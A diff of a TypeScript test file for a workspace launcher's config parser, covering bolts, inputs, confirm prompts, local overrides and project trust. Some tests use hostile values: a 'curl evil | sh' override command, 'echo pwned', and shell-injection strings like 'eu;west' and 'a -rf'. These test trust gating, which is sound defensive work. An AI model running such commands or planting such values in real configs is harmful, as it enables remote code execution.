@@ -80,37 +80,17 @@ describe("the simplest file", () => {
   });
 });
 
-describe("shared assets", () => {
-  it("are named by label from bolts, case-insensitively", () => {
-    const { workspace } = read({
-      links: [{ label: "Staging", url: "staging.acme.com" }],
-      folders: ["apps/api"],
-      bolts: [{ label: "Deploy", targets: ["staging", "apps/api"] }],
-    });
-    expect(workspace.bolts[0]!.steps).toEqual([
-      { kind: "asset", id: "link:staging" },
-      { kind: "asset", id: "folder:apps/api" },
-    ]);
-  });
-
-  it("says which asset a mistyped label probably meant", () => {
-    const { diagnostics } = read({
-      links: [{ label: "Staging", url: "staging.acme.com" }],
-      bolts: [{ label: "Deploy", targets: ["Stagin"] }],
-    });
-    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "error", hint: 'Did you mean "Staging"?' }));
-  });
-
-  it("accepts the macOS-era bundleIdOrAppName", () => {
-    const { workspace } = read({ apps: [{ label: "Slack", bundleIdOrAppName: "com.tinyspeck.slackmacgap" }] });
-    expect(workspace.apps[0]!.app).toBe("com.tinyspeck.slackmacgap");
+describe("the file's keys", () => {
+  it("has no shared sections: links and the like are unknown keys, and are ignored", () => {
+    const { workspace, diagnostics } = read({ links: [{ label: "Repository", url: "github.com/acme" }], bolts: [] });
+    expect(workspace.links).toEqual([]);
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "links" }));
   });
 });
 
 describe("per-OS values", () => {
   const file = {
-    apps: [{ label: "Editor", app: { macos: "Visual Studio Code", linux: "code" } }],
-    bolts: [{ label: "Edit", targets: ["Editor"] }],
+    bolts: [{ label: "Edit", targets: [{ label: "Editor", app: { macos: "Visual Studio Code", linux: "code" } }] }],
   };
 
   it("picks this OS's value, by the names people say", () => {
@@ -132,15 +112,14 @@ describe("per-OS values", () => {
   });
 
   it("warns about an OS it does not know", () => {
-    const { diagnostics } = read({ apps: [{ app: { macos: "Code", beos: "code" } }] });
-    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "apps[0].app.beos" }));
+    const { diagnostics } = read({ bolts: [{ label: "x", targets: [{ app: { macos: "Code", beos: "code" } }] }] });
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "bolts[0].targets[0].app.beos" }));
   });
 });
 
 describe("commands and trust", () => {
   const main = {
-    commands: [{ label: "dev", run: "pnpm dev", cwd: "apps/api", env: { PORT: 3000, DEBUG: true }, shell: "sh" }],
-    bolts: [{ label: "Run", targets: ["dev"] }],
+    bolts: [{ label: "Run", targets: [{ label: "dev", run: "pnpm dev", cwd: "apps/api", env: { PORT: 3000, DEBUG: true }, shell: "sh" }] }],
   };
 
   it("parses a command fully, env values written as they read", () => {
@@ -168,8 +147,7 @@ describe("commands and trust", () => {
 
   it("withholds files that run when opened, and apps given as paths", () => {
     const { workspace, withheld } = read({
-      files: ["deploy.command", "setup.exe", "README.md"],
-      apps: ["./tools/thing.app", "Slack"],
+      bolts: [{ label: "x", targets: [{ file: "deploy.command" }, { file: "setup.exe" }, { file: "README.md" }, { app: "./tools/thing.app" }, { app: "Slack" }] }],
     });
     expect(workspace.files.map((file) => file.label)).toEqual(["README.md"]);
     expect(workspace.apps.map((app) => app.label)).toEqual(["Slack"]);
@@ -177,7 +155,7 @@ describe("commands and trust", () => {
   });
 
   it("counts what runs code in one warning", () => {
-    const { diagnostics } = read({ files: ["x.sh"], commands: [{ run: "make" }] });
+    const { diagnostics } = read({ bolts: [{ label: "x", targets: [{ file: "x.sh" }, { run: "make" }] }] });
     expect(diagnostics).toContainEqual(
       expect.objectContaining({ at: "trust", message: "1 command and 1 item that would run code when opened declared but will not run" }),
     );
@@ -236,6 +214,79 @@ describe("bolts", () => {
     expect(diagnostics.filter((entry) => entry.message.includes("need each other"))).toHaveLength(1);
   });
 
+  it("warns about a key a bolt does not know, like the old job, and ignores it", () => {
+    const { workspace, diagnostics } = read({ bolts: [{ label: "Check", job: true, targets: [] }] });
+    expect(workspace.bolts[0]).not.toHaveProperty("job");
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "bolts[0].job" }));
+  });
+
+  it("reads keepGoing on a bolt, and finishes on a command", () => {
+    const { workspace, declaredCommands, diagnostics } = read({
+      bolts: [{ label: "Check", keepGoing: true, targets: [{ run: "pnpm test", finishes: true }, { run: "pnpm build", finishes: true, background: true }] }],
+    });
+    expect(workspace.bolts[0]!.keepGoing).toBe(true);
+    expect(declaredCommands.map((command) => command.finishes)).toEqual([true, true]);
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "bolts[0].targets[1].background" }));
+  });
+
+  it("reads the question a bolt asks before it runs", () => {
+    const { workspace, diagnostics } = read({
+      bolts: [
+        { label: "Deploy", confirm: " Deploy to production? ", targets: [] },
+        { label: "Restore", confirm: true, targets: [] },
+        { label: "Quiet", confirm: false, targets: [] },
+        { label: "Odd", confirm: 3, targets: [] },
+      ],
+    });
+    expect(workspace.bolts.map((bolt) => bolt.confirm)).toEqual(["Deploy to production?", 'Run "Restore"?', undefined, undefined]);
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "bolts[3].confirm" }));
+  });
+
+  it("reads a bolt's inputs, and warns about one it can't use and a {{name}} it doesn't declare", () => {
+    const { workspace, diagnostics } = read({
+      bolts: [
+        {
+          label: "Deploy",
+          inputs: { env: { ask: "Deploy where?", choices: ["staging", "production", "eu;west"], default: "staging" }, tag: { default: "a -rf" }, "bad name": {}, region: { default: "mars", choices: ["eu"] } },
+          confirm: "Deploy {{tag}} to {{env}}?",
+          targets: [{ run: "./deploy.sh {{env}} {{tag}} {{zone}}", finishes: true }],
+        },
+      ],
+    });
+    expect(workspace.bolts[0]!.inputs).toEqual([
+      { name: "env", ask: "Deploy where?", choices: ["staging", "production"], default: "staging" },
+      { name: "tag", ask: "tag" },
+      { name: "region", ask: "region", choices: ["eu"] },
+    ]);
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "bolts[0].inputs.bad name" }));
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "bolts[0].inputs.region.default" }));
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "bolts[0].inputs.env.choices", message: expect.stringContaining('"eu;west" has something else') }));
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "bolts[0].inputs.tag.default" }));
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "bolts[0].targets[0]", message: expect.stringContaining("{{zone}}") }));
+    expect(diagnostics.filter((entry) => entry.message.includes("{{env}}") || entry.message.includes("{{tag}}"))).toEqual([]);
+  });
+
+  it("reads steps to run together, and refuses a bolt or an empty list inside", () => {
+    const { workspace, declaredCommands, diagnostics } = read({
+      bolts: [
+        { label: "Database", targets: [{ run: "db" }] },
+        {
+          label: "Check",
+          targets: [
+            { together: [{ run: "pnpm lint", finishes: true }, { run: "pnpm test", finishes: true }, { bolt: "Database" }] },
+            { together: [{ url: "localhost:3000" }] },
+            { together: [] },
+            { run: "pnpm build", finishes: true },
+          ],
+        },
+      ],
+    });
+    expect(workspace.bolts[1]!.steps.map((step) => step.together)).toEqual([0, 0, undefined, undefined]);
+    expect(declaredCommands.map((command) => command.run)).toEqual(["db", "pnpm lint", "pnpm test", "pnpm build"]);
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "error", at: "bolts[1].targets[0].together", message: expect.stringContaining("a bolt can't run inside together") }));
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "error", at: "bolts[1].targets[2].together" }));
+  });
+
   it("refuses a second bolt of the same name", () => {
     const { workspace, diagnostics } = read({ bolts: [{ label: "x", targets: [] }, { label: "X", targets: [] }] });
     expect(workspace.bolts).toHaveLength(1);
@@ -244,31 +295,31 @@ describe("bolts", () => {
 });
 
 describe("the local override", () => {
-  it("adds to the project's lists, overrides its scalars, and replaces a bolt by name", () => {
+  it("adds bolts, overrides the scalars, and replaces a bolt by name", () => {
     const { workspace, diagnostics } = read(
       {
         name: "Acme",
-        links: [{ label: "Repo", url: "github.com/acme" }],
-        bolts: [{ label: "api", targets: ["Repo"] }],
+        bolts: [{ label: "api", targets: [{ label: "Repo", url: "github.com/acme" }] }],
       },
       {
         local: {
           name: "Acme (mine)",
-          links: [{ label: "My board", url: "linear.app/me" }],
-          bolts: [{ label: "api", targets: ["Repo", "My board"] }],
+          bolts: [
+            { label: "api", targets: [{ label: "Repo", url: "github.com/acme" }, { label: "My board", url: "linear.app/me" }] },
+            { label: "mine", targets: [{ url: "linear.app/me" }] },
+          ],
         },
       },
     );
     expect(workspace.name).toBe("Acme (mine)");
-    expect(workspace.links.map((link) => link.label)).toEqual(["Repo", "My board"]);
-    expect(workspace.bolts).toHaveLength(1);
+    expect(workspace.bolts.map((bolt) => bolt.label)).toEqual(["api", "mine"]);
     expect(workspace.bolts[0]!.steps).toHaveLength(2);
     expect(diagnostics).toEqual([]);
   });
 
   it("is read from disk beside the project file, and trusted together with it", async () => {
-    const file = await project({ commands: [{ label: "dev", run: "pnpm dev" }] });
-    await project({ commands: [{ label: "mine", run: "make me" }] }, ".", LOCAL_FILE);
+    const file = await project({ bolts: [{ label: "dev", targets: [{ label: "dev", run: "pnpm dev" }] }] });
+    await project({ bolts: [{ label: "mine", targets: [{ label: "mine", run: "make me" }] }] }, ".", LOCAL_FILE);
 
     const before = await readProjectFile(file);
     expect(before.workspace.local).toBe(join(dir, LOCAL_FILE));
@@ -278,14 +329,14 @@ describe("the local override", () => {
     expect((await readProjectFile(file)).workspace.trusted).toBe(true);
 
     // An edit to the override is an edit to what was trusted.
-    await project({ commands: [{ label: "mine", run: "curl evil | sh" }] }, ".", LOCAL_FILE);
+    await project({ bolts: [{ label: "mine", targets: [{ label: "mine", run: "curl evil | sh" }] }] }, ".", LOCAL_FILE);
     expect((await readProjectFile(file)).trust).toBe("stale");
   });
 });
 
 describe("personal workspaces", () => {
   it("are trusted because they are yours, and named after their file", async () => {
-    const file = await project({ commands: [{ run: "echo hi" }] }, "home/workspaces", "Morning.wisp.json");
+    const file = await project({ bolts: [{ label: "hi", targets: [{ run: "echo hi" }] }] }, "home/workspaces", "Morning.wisp.json");
     const { workspace } = await readProjectFile(file);
     expect(workspace.personal).toBe(true);
     expect(workspace.trusted).toBe(true);
@@ -293,16 +344,17 @@ describe("personal workspaces", () => {
   });
 
   it("may choose which app opens a folder, where a shared file may not", async () => {
-    const file = await project({ folders: [{ label: "api", path: "/x/api", openWith: "com.jetbrains.WebStorm" }] }, "home/workspaces", "Mine.json");
+    const step = { label: "api", folder: "/x/api", openWith: "com.jetbrains.WebStorm" };
+    const file = await project({ bolts: [{ label: "x", targets: [step] }] }, "home/workspaces", "Mine.json");
     expect((await readProjectFile(file)).workspace.folders[0]!.openWith).toBe("com.jetbrains.WebStorm");
 
-    const shared = read({ folders: [{ label: "api", path: "api", openWith: "com.jetbrains.WebStorm" }] });
+    const shared = read({ bolts: [{ label: "x", targets: [{ ...step, folder: "api" }] }] });
     expect(shared.workspace.folders[0]!.openWith).toBeUndefined();
-    expect(shared.diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "folders[0].openWith" }));
+    expect(shared.diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "bolts[0].targets[0].openWith" }));
   });
 
   it("cannot be impersonated by a symlink pointing at a project's file", async () => {
-    const real = await project({ commands: [{ run: "echo pwned" }] }, "repo");
+    const real = await project({ bolts: [{ label: "x", targets: [{ run: "echo pwned" }] }] }, "repo");
     await mkdir(join(dir, "home", "workspaces"), { recursive: true });
     const link = join(dir, "home", "workspaces", "sneaky.json");
     await symlink(real, link);
@@ -316,26 +368,26 @@ describe("personal workspaces", () => {
 
 describe("trust", () => {
   it("refuses a grant when the file changed after it was shown", async () => {
-    const file = await project({ commands: [{ run: "echo one" }] });
+    const file = await project({ bolts: [{ label: "x", targets: [{ run: "echo one" }] }] });
     const shown = await readProjectFile(file);
-    await project({ commands: [{ run: "echo two" }] });
+    await project({ bolts: [{ label: "x", targets: [{ run: "echo two" }] }] });
     await expect(trustProject(file, shown.hash)).rejects.toThrow(/changed while you were reading/);
   });
 });
 
 describe("checkProject", () => {
   it("reports missing paths and machine-specific ones", async () => {
-    const file = await project({ folders: ["missing", "~/somewhere"], files: ["README.md"] });
+    const file = await project({ bolts: [{ label: "x", targets: [{ folder: "missing" }, { folder: "~/somewhere" }, { file: "README.md" }] }] });
     await writeFile(join(dir, "README.md"), "hi");
     const { diagnostics } = await checkProject(file);
 
-    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "error", at: "folders[0].path" }));
-    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "folders[1].path" }));
-    expect(diagnostics.some((entry) => entry.at.startsWith("files"))).toBe(false);
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "error", at: "bolts[0].targets[0].folder" }));
+    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "bolts[0].targets[1].folder" }));
+    expect(diagnostics.some((entry) => entry.at.startsWith("bolts[0].targets[2]"))).toBe(false);
   });
 
   it("does not report a folder declared only for another OS as missing", async () => {
-    const file = await project({ folders: [{ path: "nowhere", os: "windows" }] });
+    const file = await project({ bolts: [{ label: "x", targets: [{ folder: "nowhere", os: "windows" }] }] });
     const { diagnostics } = await checkProject(file, { os: "darwin" });
     expect(diagnostics.filter((entry) => entry.level === "error")).toEqual([]);
   });
@@ -343,7 +395,7 @@ describe("checkProject", () => {
   it("allows an executable it found only once trusted", async () => {
     await writeFile(join(dir, "go"), "#!/bin/sh\n");
     await chmod(join(dir, "go"), 0o755);
-    const file = await project({ files: ["go"] });
+    const file = await project({ bolts: [{ label: "x", targets: [{ file: "go" }] }] });
     const { workspace } = await readProjectFile(file);
     // No extension, so the parser lets it through; the runner checks the execute bit.
     expect(workspace.files).toHaveLength(1);
